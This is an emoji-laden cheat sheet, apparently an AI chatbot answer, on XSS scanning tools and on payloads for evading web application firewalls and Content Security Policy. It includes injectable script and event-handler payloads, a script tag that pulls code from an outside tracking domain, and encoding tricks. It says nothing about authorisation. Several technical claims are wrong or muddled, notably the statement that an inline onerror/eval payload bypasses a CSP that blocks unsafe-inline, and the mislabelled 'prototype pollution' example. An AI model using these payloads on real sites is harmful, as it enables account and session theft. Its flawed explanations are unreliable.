Here are some solid **automation tools and WAF bypass techniques** to step up your XSS game! 🚀

## **🔧 Automation Tools for XSS**

### 1️⃣ **Dalfox** – Fast XSS Scanner

✅ **Why?** More advanced than basic fuzzers, handles modern web apps well.  
🔗 **GitHub**: [https://github.com/hahwul/dalfox](https://github.com/hahwul/dalfox)  
📌 Usage:

```bash
dalfox url "https://example.com/search?q=" --blind "https://your-xss-tracker.com"
```

💡 **Tip:** Use the **--waf-bypass** flag to test for WAF-protected inputs.

---

### 2️⃣ **XSStrike** – Intelligent XSS Detection

✅ **Why?** It analyzes the input field and generates optimized payloads.  
🔗 **GitHub**: [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)  
📌 Usage:

```bash
python3 xsstrike.py -u "https://example.com/vuln.php?input="
```

💡 **Tip:** Use **-t** for threading and **--fuzzer** for dynamic payload discovery.

### 3️⃣ **XSS Hunter** – Stored XSS Detection

✅ **Why?** Helps track stored XSS execution even when triggered days later.  
🔗 **Website**: [https://xsshunter.com/](https://xsshunter.com/)  
📌 **How to use it?**

- Sign up, get a unique tracking domain.
- Inject your XSS payload with `<script src="https://your-unique-domain.xss.ht"></script>`
- If executed, you'll see **screenshots, headers, and execution context** in the dashboard.

💡 **Tip:** Great for **multi-stage** payloads that trigger after an admin logs in.

## **🛡️ WAF Bypass Techniques**

### 1️⃣ **Case Manipulation & Encoding Tricks**

WAFs often block common XSS payloads, but they may fail on:  
✅ **Upper/Lowercase Variations:**

```html
<SCRipt>alert(1)</sCRipt>
```

✅ **Hex/Unicode Encoding:**

```html
%3Cscript%3Ealert(1)%3C/script%3E
```

✅ **JavaScript Protocol Encoding:**

```html
<a href="jAvAsCrIpT:alert(1)">Click me</a>
```

---

### 2️⃣ **Polyglot Payloads (Universal Bypasses)**

These payloads execute in multiple contexts and evade filters. Example:

```html
"><svg onload=confirm(1)>  
```

✅ Works in **HTML, JS, and SVG** contexts!  
✅ Short enough to bypass length-based WAF filters.

---

### 3️⃣ **Bypassing Content Security Policy (CSP)**

If CSP is blocking inline scripts, try:  
✅ **Dynamic JavaScript Execution:**

```html
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

- **atob()** decodes Base64 to avoid detection.
- Bypasses CSP if `unsafe-inline` is blocked.

---

### 4️⃣ **DOM-Based XSS & JavaScript Prototype Pollution**

Some WAFs only filter **reflected XSS**, missing DOM-based attacks:  
✅ **Override JavaScript Properties:**

```html
https://victim.com/#constructor.constructor=alert(1)//
```

- If the page uses `location.hash`, this **tricks JS into running alert(1)**.
- Often **not detected by WAFs** since it doesn’t rely on `<script>`.

---

### **🔥 Final Tips:**

✅ **Always test inside a real browser** – Some payloads fail due to security restrictions.  
✅ **Use mutation XSS payloads** – Some filters sanitize **basic** XSS but fail against **mutated inputs**.  
✅ **Try different HTTP methods** – `POST` requests may bypass XSS filters applied only to `GET` requests.
